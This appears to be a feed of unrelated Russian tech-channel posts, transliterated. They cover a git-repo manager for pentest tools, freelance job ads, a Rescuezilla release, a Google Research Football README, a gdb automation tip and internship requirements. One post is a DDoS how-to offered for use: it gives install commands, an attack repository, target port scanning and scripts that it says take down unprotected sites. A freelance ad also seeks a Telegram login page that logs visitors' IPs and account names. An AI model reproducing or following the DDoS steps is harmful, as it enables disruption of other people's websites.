TheCl0n3r will allow you to download and manage your git repositories.  PrefaceAbout 90% of the penetration testing tools used in my experience can be found primarily on github. The aim of this was to make it easier to download, update and delete these git repositories. If moving to a new testing system, make it simpler to transfer the same tool set being used.Usage  Search Github  Listing currently installed tools  Build GO Binaries and Install Python tools  Features    Download repos  Updates repos  Deletes repos  Search github repos  Install Go & Python tools.  Keeps everything orgainzed  Includes some basic tools to get started    Quick setup    If you already have a list of tools in you are using just add it to the tool_list.txt file inside the TheCl0n3r directory then: "python3 thecl0n3r.py -d"  When moving to a new system just copy over the tool_list.txt file and re-download... Cake      Requirements    Python3  Pipenv  GO  Github Access Token    Install Pipenv    Install GO    Installation:git clone https://github... #accesstoken #penetrationtesting #python #thecl0n3r

Ob'edinit' skripty raznykh marketpleisov v odnu sistemu - python3   Zdravstvuite. Est' skripty na Python3 dlia raboty s API etikh platform: sait opencart3, ebay, backmarket, refurbed(limited), rakuten, amazon. Dlia API vsekh  napisany skripty na Pitone3.  Mne nuzhno ob'edinit' eti skripty v odnu sistemu i dobavit' v nikh neobkhodimyi funktsional pri otsutstvii, bez interfeisa, tol'ko terminal'nyi zapusk na Linux.  S pomoshch'iu sistemy nuzhno delat' na vsekh platformakh sleduiushchee: MARKETPLACES create_product/offer ... avtomaticheski sozdavat' na vsekh torgovykh ploshchadkakh sync_product/offer ... poluchit' vse novye tovary na vsekh torgovykh ploshchadkakh sync_offer ... poluchit' vse moi predlozheniia na vsekh torgovykh ploshchadkakh update_stock ... avtomaticheskaia korrektirovka vsekh tsen i kol-va na vsekh torgovykh ploshchadkakh get_orders ... avtomaticheski poluchat' vse zakazy so vsekh torgovykh ploshchadok submit_tracking ... avtomaticheski razmeshchat' nomer otslezhivaniia dlia vsekh zakazov na vsekh torgovykh ploshchadkakh (gde prisutstvuet eta optsiia) --- OTDELIT' SKRIPT DLIa ATRIBUTOV/KATEGORII V OTDEL'NYI FAIL  - UPROSTIT' PROTsESS DOBAVLENIIa NOVYKh ATRIBUTOV/KATEGORII.  Primer struktury faila, - 1 fail dlia kategorii i atributov vo vsekh marketpleisakh: categories_keys= {     'laptop': '18223',     'laptop_apple': '23323',     }      categories_attributes= {     'laptop': {         'CPU': ['i5-8250U', 'i5-8350U', .... ],         'HDD': ['250GB', '320GB', .... ],         }     'laptop_apple': {         'CPU': ['i5-8250U', 'i5-8350U', .... ],         'HDD': ['250GB', '320GB', .... ],         }     'mobile':  --- PAYPAL API Restful - poluchat' vsiu informatsiiu o zakazakh, sokhraniat' v CSV, no nuzhno pomechat' OPENCART zakazy. --- EBAY API - est' 2 puti raboty:  SOAP(est' na Github) i RestApi(realizovano), nuzhno, chtoby rabotali oba.   ERRORS - po vozniknoveniiu oshibok vypolnenie ne ostanavlivaetsia, oshibka zapisyvaetsia v error_log.csv s maksimumom dannykh o nei i prodolzhaetsia vypolnenie.  EMAIL - Poluchenie dannykh o nalichii tovara iz email, ispol'zovat' USER: title/email/passcode = v kachestve bezopasnosti. ---Takzhe, nuzhno dobavit' proverku, vse li neobkhodimye polia est' v  stock.csv i products.csv, tol'ko kolonki, ne informatsiia v nikh. Validatsiia sozherzhaniia polei proizvoditsia na drugikh etapakh.  CSV -Nuzhno standartizirovat' format CSV failov(products,orders,errors).  INVOICE -Avtomaticheskaia generatsiia invoisa ispol'zuia    80% funktsionala uzhe realizovano, no dlia kazhdogo marketpleisa raznye formaty dannykh, nuzhno privesti vse k odnomu formatu i mestami dobavit' otsutstvuiushchii funktsional.  Predlagaiu razbit' vypolnenie proekta na takie etapy, po kazhdomu budet proivedeno testirovanie i oplata: 1. ebay  2. paypal 3. opencart / backmarket / rakuten / refurbed(ogranicheno)  4. amazon 5. invoice 6. single_csv  Proshu v predlozheniiakh pisat' vremia i stoimost' vypolneniia po kazhdomu etapu.  P.S.: proekt ne odnorazovyi, takzhe sleduiushchim budet - prikrutit' API servisov dostavki i dal'neishaia podderzhka i vozmozhnoe rasshirenie funktsionala.  https://freelancehunt.com/project/obedinit-skriptyi-raznyih-marketpleysov-odnu/767283.html?utm_source=vk&utm_medium=social&utm_campaign=new_projects

Opublikovan novyi vypusk distributiva Rescuezilla 2.0, prednaznachennogo dlia rezervnogo kopirovaniia, vosstanovleniia sistem posle sboev i diagnostiki razlichnykh apparatnykh problem. Distributiv postroen na paketnoi baze Ubuntu i prodolzhaet razvitie proekta "Redo Backup & Rescue", razrabotka kotorogo byla prekrashchena v 2012 godu. Rescuezilla podderzhivaet rezervnoe kopirovanie i vosstanovlenie sluchaino udalionnykh failov v razdelakh Linux, macOS i Windows. Vypolniaetsia avtomaticheskii poisk i podkliuchenie setevykh razdelov, kotorye mozhno ispol'zovat' dlia razmeshcheniia rezervnykh kopii. Graficheskii interfeis osnovan na obolochke LXDE. Dlia zagruzki predlagaiutsia live-sborki dlia 64-razriadnykh sistem x86 (771MB). Sborka dlia 32-razriadnykh sistem vremenno priostanovlena.

Vopros, chto budet ustanovleno na samom KEGE, otkrytyi.   Na dannyi moment ia ne videl ni odnogo dokumenta, kotoryi by reglamentiroval perechen' ustanavlivaemogo na rabochie stantsii PO.  Poetomu lovi spisok besplatnogo PO, kotorym pol'zuiutsia v shkolakh, kogda net litsenzii ili tekhnicheskoi vozmozhnosti postavit' trebovatel'nye (v tom chisle platnye) sredy programmirovaniia i ofisnye pakety.  Sovetuiu, kak minimum, oznakomit'sia s kazhdym iz perechislennykh sredstv, chtoby na ekzamene ne tratit' vremia na izuchenie interfeisa.

Moshchnaia DDOS-Ataka    Sovershit' prostuiu DDoS-ataku dovol'no prosto, nam pomozhet soft na Python.    Ustanovka:  pkg install python3  pkg install nmap  git clone https://github.com/HardyTomas/DDos-Attack-OVH-  cd DDos-Attack-OVH-  pip3 install toripchanger  pip3 install -r requirements.txt    Ispol'zovanie:  Snachala nuzhno proskanirovat' porty saita:  nmap *adres saita*; primer - nmap google.com  Nemnogo zhdiom, a potom smotrim otkrytye porty.  Esli 443 port otkryt:  python3 443port.py    Esli 443 port zakryt:  python3 80port.py    Vvedite adres saita, a potom zhdite.  Esli sait stoit na prostom khostinge i na niom net zashchity ot DDOS, to sait perestanet funktsionirovat' cherez neskol'ko minut.  Stoit ponimat', chto takim skriptom ne povalit' krupnye saity!

Razrabotka na Python3 avtorizatsii cherez API Telegram   Razrabotka na Python3 avtorizatsii cherez API Telegram  1. Pol'zovatel' popadaet na uzhe svertstanuiu stranitsu saita i avtoriziruetsia vvedia (Nomer telefona: Kod: 2fa esli nuzhno).  2. Posle togo kak avtorizatsiia proshla uspeshno ego redirektit na nuzhnuiu stranitsu. 3. V baze zapisyvaetsia tak - ego IP (kotoryi zapomnil sait) : Imia v telegram: Login v telegram esli est'.  Baza  mozhet vygliadet' kak pustaia stranitsa k primeru takom vide: 12.10.2020 IP:Imia:Login IP:Imia:Login IP:Imia:Login IP:Imia:Login 13.10.2020 IP:Imia:Login IP:Imia:Login ...  Ishchem razrabotchika na dlitel'nyi proekt. Bolee 5ti raznykh TZ. Posle uspeshnogo vypolneniia etogo TZ, srazu daem drugoe. Dannoe zadanie iavliaetsia testovym dlia proverki znanii raboty s API Telegram. Nuzhno sdelat' v korotkie sroki i ramkakh normal'nogo biudzheta.  https://freelancehunt.com/project/razrabotka-na-python3-avtorizatsii-cherez-api/764465.html?utm_source=vk&utm_medium=social&utm_campaign=new_projects

Futbol Issledovanii Google  Etot repozitorii soderzhit sredu RL, osnovannuiu na igrovom protsesse s otkrytym iskhodnym kodom Futbol. On byl sozdan komandoi Google Brain dlia issledovatel'skikh tselei.  Poleznye ssylki: (Novinka!) GRF Kaggle competition - primite uchastie v sorevnovanii, igraia v igry protiv drugikh, vyigraite prizy i stan'te chempionom GRF!GRF Game Server-bros'te vyzov drugim issledovateliam!Begite v Colab-nachnite trenirovku menee chem za 2 minuty.Google Research Football PaperSoobshchenie v bloge GoogleAIGoogle Research Football on CloudSpisok rassylki - pozhaluista, ispol'zuite ego dlia sviazi s nami (kommentarii / predlozheniia / idei funktsii) Dlia nepublichnykh voprosov, kotorye vy khoteli by obsudit' neposredstvenno s komandoi GRF, pozhaluista ispol'zuite google-research-football@google.com.  My khoteli by poblagodarit' Bastiana Koningsa Shuilinga, kotoryi iavliaetsia avtorom i otkrytym iskhodnym kodom original'noi versii etoi igry.  bystryi start  V Kolabe  Otkroite nash primer Colab, kotoryi pozvolit vam nachat' obuchenie vashei modeli menee chem za 2 minuty.  Etot metod ne podderzhivaet rendering igry na ekrane - esli vy khotite uvidet' zapushchennuiu igru, pozhaluista, ispol'zuite privedennyi nizhe metod.  Ispol'zovanie Docker  Eto rekomenduemyi sposob izbezhat' nesovmestimykh versii paketov. Instruktsii dostupny zdes'.  Na vashem komp'iutere  1. Ustanovite neobkhodimye pakety  Linuks sudo apt-get install git cmake build-essential libgl1-mesa-dev libsdl2-dev libsdl2-image-dev libsdl2-ttf-dev libsdl2-gfx-dev libboost-all-dev libdirectfb-dev libst-dev mesa-utils xvfb x11vnc libsdl-sge-dev python3-pip  Mac OS X  Snachala ustanovite zavarku. On dolzhen avtomaticheski ustanavlivat' instrumenty komandnoi stroki. Dalee ustanovite neobkhodimye pakety: brew install git python3 cmake sdl2 sdl2_image sdl2_ttf sdl2_gfx boost boost-python3  Dlia nastroiki pygameTakzhe trebuetsia ustanovit' bolee starye versii SDL: brew install sdl sdl_image sdl_mixer sdl_ttf portmidi  2a. iz paketa PyPi pip3 install gfootball  2b. ustanovka iz iskhodnykh tekstov s ispol'zovaniem repozitoriia GitHub git clone https://github.com/google-research/football.git cd football  Pri zhelanii vy mozhete ispol'zovat' virtual'nuiu sredu: python3 -m venv football-env source football-env/bin/activate  Poslednii shag-eto sozdanie okruzhaiushchei sredy: pip3 install .  Eta komanda mozhet vypolniat'sia v techenie neskol'kikh minut, tak kak ona kompiliruet sredu C++ v fonovom rezhime.  3. Pora igrat'! python3 -m gfootball.play_game --action_set=full  Obiazatel'no oznakom'tes' s otobrazheniiami klaviatury. Chtoby vyiti iz igry, nazhmite Ctrl+C v terminale.  Obuchenie agentov igre GRF  Trenirovka bega  Chtoby zapustit' obuchenie TF, ustanovite dopolnitel'nye zavisimosti (ili al'ternativno ispol'zuite predostavlennoe izobrazhenie Docker): Obnovite PIP, chtoby tensorflow 1.15 byl dostupen: python3 -m pip install --upgrade pip setuptoolsTenzornyi potok: pip3 install tensorflow==1.15.*ili pip3 install tensorflow-gpu==1.15.*, v zavisimosti ot togo, khotite li vy protsessor ili Versiia GPU;Sonet: pip3 install dm-sonnet==1.*;Bazovye Linii OpenAI: pip3 install git+https://github.com/openai/baselines.git@master. Zatem: Chtoby zapustit' primer PPO-eksperimenta po academy_empty_goalstsenariiu, vypolnite python3 -m gfootball.examples.run_ppo2 --level=academy_empty_goal_closeChtoby zapustit' academy_pass_and_shoot_with_keeperstsenarii, vypolnite python3 -m gfootball.examples.run_ppo2 --level=academy_pass_and_shoot_with_keeper Chtoby trenirovat'sia s sokhraneniem khoroshikh povtorov, begite python3 -m gfootball.examples.run_ppo2 --dump_full_episodes=True --render=True  Dlia togo chtoby vosproizvesti rezul'taty PPO iz stat'i, pozhaluista, obratites' k: gfootball/examples/repro_checkpoint_easy.shgfootball/examples/repro_scoring_easy.sh Igraem v etu igru  Obratite vnimanie, chto igra osushchestvliaetsia cherez sredu, poetomu igroki, upravliaemye chelovekom, ispol'zuiut tot zhe interfeis, chto i agenty. Odnim iz vazhnykh sledstvii iavliaetsia to, chto sushchestvuet odno deistvie na 100 ms, soobshchaemoe okruzhaiushchei srede, kotoroe mozhet vyzvat' effekt zaderzhki pri vosproizvedenii.  Sopostavleniia klaviatury  Igra opredeliaet sleduiushchee otobrazhenie klaviatury (dlia keyboardtipa igroka): ARROW UP - begi naverkh.ARROW DOWN - begi na dno.ARROW LEFT - begi nalevo.ARROW RIGHT - begi napravo.S - korotkii pas v rezhime ataki, davlenie v rezhime oborony.A - vysokii prokhod v rezhime ataki, skol'zhenie v rezhime zashchity.D - vystrel v rezhime ataki, davlenie komandy v rezhime oborony.W - dlinnyi pas v rezhime ataki, davlenie vrataria v rezhime oborony.Q - perekliuchite aktivnogo igroka v rezhim zashchity.C - dribling v rezhime ataki.E - sprint. Igrat' protiv vstroennogo iskusstvennogo intellekta  Begi python3 -m gfootball.play_game --action_set=full. Po umolchaniiu on zapuskaetsia bazovyi stsenarii i levyi igrok upravliaiutsia s pomoshch'iu klaviatury. Razlichnyi podderzhivaiutsia tipy igrokov (geimpad, vneshnie boty, agenty...). Dlia vozmozhnogo parametry zapushcheny python3 -m gfootball.play_game -helpfull.  Igrat' protiv predvaritel'no obuchennogo agenta  V chastnosti, mozhno igrat' protiv agenta, obuchennogo run_ppo2stsenariiu s pomoshch'iu sleduiushchaia komanda (obratite vnimanie, chto flag action_set otsutstvuet, tak kak agent PPO ispol'zuet znachenie po umolchaniiu nabor deistvii): python3 -m gfootball.play_game --players "keyboard:left_players=1;ppo2_cnn:right_players=1,checkpoint=$YOUR_PATH"  Obuchennye kontrol'no-propusknye punkty  My predostavliaem obuchennye kontrol'nye tochki PPO dlia sleduiushchikh stsenariev: 11_vs_11_easy_stochastic,academy_run_to_score_with_keeper. Chtoby uvidet', kak igraiut kontrol'nye tochki, begite python3 -m gfootball.play_game --players "ppo2_cnn:left_players=1,policy=gfootball_impala_cnn,checkpoint=$CHECKPOINT" --level=$LEVEL, gde $CHECKPOINTnakhoditsia put' k zagruzhennoi kontrol'noi tochke.  Chtoby trenirovat'sia protiv kontrol'noi tochki, vy mozhete peredat' argument 'extra_players' v funktsiiu create_environment. Naprimer, extra_players= 'ppo2_cnn:right_players=1, policy=gfootball_impala_cnn, checkpoint=$CHECKPOINT'.  Chastye Problemy I Resheniia  Rendering vne ekrana (na servere bez displeia / bez graficheskogo protsessora)  Mozhno sdelat' programmnyi rendering s pomoshch'iu MESA. Dlia etogo, prezhde chem nachat' sreda, v kotoroi neobkhodimo sozdat' virtual'nyi displei (pri uslovii, chto vy ispol'zuete razreshenie po umolchaniiu): Xvfb :1 -screen 0 1280x720x24+32 -fbdir /var/tmp & export DISPLAY=:1  Obratite vnimanie, chto rendering programmnogo obespecheniia znachitel'no uvelichivaet zagruzku protsessora i rabotaet medlenno.  #Python

Avtomatizatsiia GDB s pomoshch'iu xdotool https://nixtux.ru/1035  Ponadobilos' v otladchike gdb ochen' mnogo raz povtorit' odinakovoe deistvie, chtoby poimat' znacheniia peremennykh, kotorye byli v moment segfolta.  Otkryl 2 terminala, v odnom zapustil programmu pod gdb, postavil tochku ostanovki (breakpoint), zapustil (run), drugoi sredstvami okonnogo menedzhera zakrepil poverkh drugikh okon, zapustiv v nem: sleep 5; while true ; do xdotool type c && for type in A B ; do xdotool key KP_Enter && xdotool key p && xdotool key space && for i in $type E V R ; do xdotool type $i ; done; done && xdotool key KP_Enter ; sleep 0; if ! ps aux | grep -vE 'gdb|grep' | grep -q '/usr/bin/python3 /usr/bin/livecd-creator' ; then break ; fi; done Etot kod vvodit nuzhnye komandy v gdb i proveriaet, ne ostanovilsia li protsess, t.e. ne proizoshel li segfolt, a esli proizoshel, to perestaet ikh vvodit'. Poshel po svoim delam, ono samo otrabotalo, vernulsia, peredo mnoi byl nagliadnyi rezul'tat.  Istochnik: https://nixtux.ru/1035

VAZhNAIa INFORMATsIIa    Chitai etot post ochen' vnimatel'no, esli khochesh' proiti proizvodstvennuiu praktiku v PAO <<Gazprom neft'>> ili vesti s ikh nauchnymi otdelami sovmestnoe issledovanie dlia napisaniia DIPLOMA    Dlia togo, chtoby popast' v interesuiushchii tebia otdel, neobkhodimo podkhodit' po trebovaniiam, kotorye napisany nizhe     Otdel razvitiia tsifrovoi ekosistemy  Trebovaniia: * Ponimanie odnogo ili neskol'kikh tsifrovykh napravlenii: iskusstvennyi intellekt, bol'shie dannye, internet veshchei i nosimye ustroistva, blokchein, robototekhnika, bespilotnaia tekhnika i drony, virtual'naia i dopolnennaia real'nost', additivnye tekhnologii, videoanalitika, kvantovye tekhnologii. * Uverennoe vladenie MS Office (Word, Excel, PowerPoint). * Opyt provedeniia prezentatsii (zhelatelen). * Opyt provedeniia pervichnykh interv'iu (zhelatelen). * Znanie angliiskogo ne nizhe urovnia Intermediate (zhelatel'no). * Ponimanie arkhitektury reliatsionnykh baz dannykh ili proektirovaniia saitov\portalov (zhelatel'no).    Tsentr tekhnologii Promyshlennogo interneta veshchei (IIoT)  Trebovaniia: * Rabota s algoritmami, znaniia odnogo iz sovremennykh iazykov programmirovaniia, bazovyi opyt rabotat' s IoT protokolami, zhelatel'no vladenie paketom dlia mat-modelirovaniia (Maple, MathCad, MathLab ili analogi).     Tsentr tekhnologii Raspredelennogo reestra (Blockchain)  Trebovaniia: * Po pervomu napravleniiu (sozdanie prototipov reshenii s primeneniem tekhnologii raspredelennogo reestra): znaniia v tekhnologii raspredelennogo reestra, zhelatel'ny znaniia odnoi iz blokchein-platform (hlf, masterchain, eth ili drugikh), uverennyi pol'zovatel' OS Linux i Windows. Znanie odnogo iz iazykov programmirovaniia: JavaScript, Java, Swift, Go, Solidity, C++ ili znaniia v oblasti UX.  * Po vtoromu napravleniiu (analiz biznes protsessov kompanii i poisk reshenii pri pomoshchi tekhnologii raspredelennogo reestra) : sposobnosti k logicheskomu analizu, bazovoe ponimanie logiki postroeniia biznes protsessov, bazovye znaniia tekhnologii raspredelennogo reestra, uverennyi pol'zovatel' MS Office (Word, Excel, PowerPoint)    Otdel matematicheskogo modelirovaniia perspektivnykh napravlenii Tsentra monetizatsii dannykh    Trebovaniia: Zhelatelen opyt raboty s odnoi iz perechislennykh tekhnologii v kazhdom domene. * Iazyki programmirovaniia: Python3, SQL * Sredy razrabotki: Jupyter, Notebook(Lab), VS Code / PyCharm * Instrumenty kontrolia versii: Git, Gitlab * Instrumenty analiza dannykh: NumPy, SciPy, Pandas,Scikit-learn, XGBoost / LightGBM / CatBoost / TensorFlow / Keras / PyTorch * Instrumenty upravleniia rabochim okruzheniem i sredoi ispolneniia: Docker, rabota s udalennymi serverami, Anaconda & pip environment * Instrumenty vizualizatsii dannykh i monitoringa: Matplotlib / Seaborn / Plotly * Instrumenty razrabotki prilozhenii: Flask * Sredstva sbora, khraneniia, transfera i preobrazovaniia dannykh: PostgreSQL    Tsentr tekhnologii virtual'noi, dopolnennoi real'nosti i estestvennykh interfeisov.  Trebovaniia: * Vazhno -- umenie razobrat'sia v novoi tekhnologii, opisat' eio preimushchestva i sostavit' plan vnedreniia v kompaniiu soglasno normativam, posle kontrolirovat' na protsessakh vnedreniia. * Obiazatelen opyt v proektnoi deiatel'nosti i bazovye znaniia proektnoi metodologii.  V kazhdyi otdel mogut popast' ogranichennoe kolichestvo studentov!
